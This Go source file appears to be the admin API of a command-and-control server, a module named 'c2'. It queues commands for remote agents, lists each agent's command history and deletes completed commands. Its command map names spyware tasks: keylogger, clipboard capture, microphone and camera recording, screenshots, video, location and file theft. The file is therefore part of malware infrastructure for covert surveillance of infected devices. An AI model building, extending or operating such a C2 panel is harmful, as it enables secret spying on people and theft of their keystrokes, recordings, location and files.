package admin

import (
	"c2/database"
	"c2/utils"
	"database/sql"
	"encoding/json"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

type CommandRequest struct {
	Command string `json:"command"`
}

var commandExtensionMap = map[string]string{
	"clipboard":  ".txt",
	"keylogger":  ".txt",
	"mic":        ".wav",
	"location":   ".json",
	"screenshot": ".png",
	"camera":     ".jpg",
	"video":      ".mp4",
	"get_file":   ".zip",
}

// SendCommand godoc
// @Summary Send a command to an agent
// @Description Queue a command to be executed by the specified agent
// @Tags admin
// @Accept json
// @Produce json
// @Param agent_id path string true "Agent ID"
// @Param command body CommandRequest true "Command payload"
// @Success 200 {object} map[string]string
// @Failure 400 {string} string "Invalid input"
// @Failure 500 {string} string "Failed to send command"
// @Router /admin/command/{agent_id}/send [post]
func SendCommand(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["agent_id"]

	var req CommandRequest
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil || req.Command == "" {
		utils.LogError("Invalid command request")
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	command := strings.ToLower(req.Command)
	ext, ok := commandExtensionMap[command]
	if !ok {
		utils.LogWarning("Unknown command type sent: " + command)
		ext = ""
	}

	db := database.Connect()
	defer db.Close()

	_, err = db.Exec(`
		INSERT INTO commands (agent_id, command, status, created_at)
		VALUES (?, ?, 'pending', ?)`,
		agentID, req.Command, time.Now())
	if err != nil {
		utils.LogError("Failed to insert command: " + err.Error())
		http.Error(w, "Failed to send command", http.StatusInternalServerError)
		return
	}

	utils.LogInfo("Command sent to agent: " + agentID + " -> " + req.Command + " (" + ext + ")")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"message":  "Command sent successfully",
		"expected": ext,
	})
}

// GetCommandsByAgent godoc
// @Summary Get all commands for an agent
// @Description Retrieve command history for a given agent ID
// @Tags admin
// @Produce json
// @Param agent_id path string true "Agent ID"
// @Success 200 {array} map[string]interface{}
// @Failure 500 {string} string "Failed to get commands"
// @Router /admin/command/{agent_id} [get]
func GetCommandsByAgent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["agent_id"]

	db := database.Connect()
	defer db.Close()

	rows, err := db.Query(`
		SELECT id, agent_id, command, status, result, created_at, executed_at
		FROM commands
		WHERE agent_id = ?
		ORDER BY created_at DESC`, agentID)

	if err != nil {
		utils.LogError("Failed to query commands: " + err.Error())
		http.Error(w, "Failed to get commands", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var commands []map[string]interface{}

	for rows.Next() {
		var cmdID int
		var agent, cmdText, status, createdAt string
		var result sql.NullString
		var executedAt sql.NullString

		err := rows.Scan(&cmdID, &agent, &cmdText, &status, &result, &createdAt, &executedAt)
		if err != nil {
			utils.LogError("Failed to scan command row: " + err.Error())
			continue
		}

		command := map[string]interface{}{
			"id":          cmdID,
			"agent_id":    agent,
			"command":     cmdText,
			"status":      status,
			"result":      "",
			"created_at":  createdAt,
			"executed_at": "",
		}

		if result.Valid {
			command["result"] = result.String
		}
		if executedAt.Valid {
			command["executed_at"] = executedAt.String
		}

		commands = append(commands, command)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(commands)
}

// DeleteCommand godoc
// @Summary Delete a completed command with result
// @Description Remove a command entry if it is completed and has result
// @Tags admin
// @Produce plain
// @Param id path string true "Command ID"
// @Success 200 {string} string "Command deleted successfully"
// @Failure 400 {string} string "Command cannot be deleted"
// @Failure 404 {string} string "Command not found"
// @Failure 500 {string} string "Failed to delete command"
// @Router /admin/command/{id} [delete]
func DeleteCommand(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	commandID := vars["id"]

	db := database.Connect()
	defer db.Close()

	var status, result string
	err := db.QueryRow(`
		SELECT status, result FROM commands WHERE id = ?`, commandID).Scan(&status, &result)
	if err != nil {
		utils.LogError("Failed to query command: " + err.Error())
		http.Error(w, "Command not found", http.StatusNotFound)
		return
	}

	if status != "completed" || result == "" {
		utils.LogWarning("Command cannot be deleted, invalid status or no result: " + commandID)
		http.Error(w, "Command cannot be deleted", http.StatusBadRequest)
		return
	}

	_, err = db.Exec(`DELETE FROM commands WHERE id = ?`, commandID)
	if err != nil {
		utils.LogError("Failed to delete command: " + err.Error())
		http.Error(w, "Failed to delete command", http.StatusInternalServerError)
		return
	}

	utils.LogInfo("Command deleted successfully: " + commandID)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Command deleted successfully"))
}
